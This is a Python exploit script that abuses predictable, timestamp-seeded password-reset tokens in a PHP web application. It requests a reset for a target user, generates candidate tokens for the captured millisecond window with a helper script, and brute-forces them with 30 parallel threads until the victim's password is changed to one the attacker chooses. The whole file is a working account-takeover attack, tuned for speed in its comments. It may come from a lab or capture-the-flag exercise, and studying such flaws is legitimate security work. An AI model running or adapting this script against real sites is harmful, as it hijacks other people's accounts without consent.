#!/usr/bin/env python3
import requests, sys, subprocess, time, threading
from concurrent.futures import ThreadPoolExecutor

SENT_MARKER    = "Email sent!"
SUCCESS_MARKER = "Password changed!"
WORKERS        = 30

def collect_tokens(ts_lower, ts_upper):
    out = subprocess.check_output(["php", "generateToken.php", str(ts_lower), str(ts_upper)])
    tokens = [t for t in out.decode().strip().split("\n") if t]
    # The 2.2s pg_connect runs BEFORE generateToken(), so the real seed sits at the
    # very top of the window (last ~15ms). Spray highest-timestamp-first -> hit it first.
    tokens.reverse()
    return tokens

def rest_password(target_url, tokens, new_password, workers):
    total = len(tokens)
    found = threading.Event()
    state = {"token": None, "done": 0}
    lock  = threading.Lock()

    def try_token(tok):
        if found.is_set():
            return
        try:
            # plain request per token: independent PHPSESSID, so PHP's per-session
            # file lock never serializes the workers
            r = requests.post(f"{target_url}/resetpassword.php",
                              data={"token": tok, "password1": new_password, "password2": new_password},
                              timeout=20)
            hit = SUCCESS_MARKER in r.text
        except requests.RequestException:
            return
        with lock:
            state["done"] += 1
            if hit and not found.is_set():
                state["token"] = tok
                found.set()
            sys.stdout.write(f"\r[*] tried {state['done']}/{total} | found: {'YES' if found.is_set() else 'no'}   ")
            sys.stdout.flush()

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(try_token, t) for t in tokens]
        for f in futs:                       # stop feeding once we've won
            if found.is_set():
                break
        ex.shutdown(wait=False, cancel_futures=True)
    print()
    return state["token"]

def main():
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <target_url> <target_user> <new_password>")
        sys.exit(1)

    target_url   = sys.argv[1].rstrip("/")
    target_user  = sys.argv[2]
    new_password = sys.argv[3]

    ts_lower = int(time.time() * 1000)
    r = requests.post(f"{target_url}/forgotpassword.php", data={"username": target_user}, timeout=20)
    ts_upper = int(time.time() * 1000)

    if SENT_MARKER not in r.text:            # precondition
        print(f"[-] Precondition failed: no '{SENT_MARKER}'. User missing or blocked (admin is excluded).")
        sys.exit(1)

    tokens = collect_tokens(ts_lower, ts_upper)
    print(f"[*] Reset requested for {target_user}")
    print(f"[*] Seed window = {ts_upper - ts_lower} ms  ->  {len(tokens)} candidates (spraying top-down)\n")

    start = time.time()
    token = rest_password(target_url, tokens, new_password, WORKERS)
    elapsed = time.time() - start

    if token:
        print(f"[+] SUCCESS in {elapsed:.1f}s -- {target_user}'s password is now '{new_password}'")
        print(f"[+] Winning token: {token}")
    else:
        print(f"[-] FAILED after {elapsed:.1f}s -- no match. Raise WORKERS or check clock skew.")

if __name__ == "__main__":
    main()
